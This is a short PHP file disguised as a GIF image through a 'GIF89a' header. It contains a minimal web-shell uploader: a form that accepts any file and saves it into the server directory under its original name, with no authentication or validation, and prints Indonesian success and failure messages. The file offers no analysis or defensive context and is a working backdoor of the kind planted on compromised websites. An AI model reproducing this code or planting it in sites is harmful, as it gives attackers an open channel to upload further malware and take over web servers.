<?php
?>
GIF89a1
<?php  echo '[syslog]01
'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if ($_POST['_upl'] == 'Upload') { if (@move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; } else { echo '<b>Upload GAGAL !!!</b><br><br>'; } echo '[syslog]02
'; } echo '[syslog]03
';